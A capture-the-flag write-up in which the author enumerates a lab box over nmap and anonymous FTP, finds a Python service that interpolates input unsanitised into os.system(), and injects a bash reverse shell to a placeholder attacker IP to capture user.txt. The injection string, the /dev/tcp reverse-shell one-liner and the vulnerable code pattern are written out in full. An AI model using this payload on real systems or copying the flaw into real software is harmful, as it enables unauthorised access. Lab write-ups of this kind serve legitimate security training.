# Find all the flags and discover Batman's secret! — Part 1: user.txt

## Techniques used

- Anonymous FTP enumeration
- Raw TCP service probing (non-HTTP)
- Command injection (unsanitized shell string interpolation)
- Reverse shell via `/dev/tcp`

## Tools used

- nmap
- ftp
- curl
- nc (netcat)
- bash

## Commands and output

### 1. Port scan

```bash
$ nmap 10.10.0.56
```

```text
PORT     STATE SERVICE
21/tcp   open  ftp     vsftpd 3.0.5
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4
3000/tcp open  ppp?
```

### 2. Anonymous FTP login

```bash
$ ftp 10.10.0.56
```

```text
Name: anonymous
Password:
230 Login successful.
```

### 3. FTP root directory listing

```bash
$ ls -la
```

```text
drwxr-xr-x    1 0        0            4096 Jul 23 13:42 .
drwxr-xr-x    1 0        0            4096 Jul 23 13:42 ..
-rwxr-xr-x    1 0        0            1115 Jul 23 13:42 alert.py
drwxrwxrwx    1 0        0            4096 Jul 23 13:42 logs
```

### 4. Probing port 3000

```bash
$ curl -i http://10.10.0.56:3000/
```

```text
🦇 Gotham Hotline: Identify yourself.
curl: (1) Received HTTP/0.9 when not allowed
```

Not an HTTP service — a raw TCP socket, confirmed by switching to `nc`.

### 5. Reading the downloaded `alert.py`

```bash
$ get alert.py
$ cat alert.py
```

```python
if data == "G0th4mN33dsTh3B4t!":
    conn.send(b'Authorized signal. What is the emergency?\n$> ')
    alert_text = conn.recv(1024).strip().decode()
    os.system("bash -c 'echo %s > /opt/hotline/logs/report.txt'" % alert_text)
```

Hardcoded password, and `alert_text` interpolated unsanitized into `os.system()`.

### 6. Command injection via the hotline

```bash
$ nc 10.10.0.56 3000
```

```text
🦇 Gotham Hotline: Identify yourself.
$> G0th4mN33dsTh3B4t!
Authorized signal. What is the emergency?
$> x'; bash -c "bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1"; echo '
Alert received. Mobilizing Knightfall Protocol.
Batmobile deployed.
```

### 7. Catching the reverse shell

```bash
$ nc -lvnp 4444
```

```text
bruce@gotham:~$
```

### 8. Reading user.txt

```bash
$ ls
$ cat user.txt
```

```text
EPI{1s_8ruc3_W4yn3_84tm4n?}
```

## Evidence

- Hotline password: `G0th4mN33dsTh3B4t!`
- Compromised user: `bruce`
- user.txt: `EPI{1s_8ruc3_W4yn3_84tm4n?}`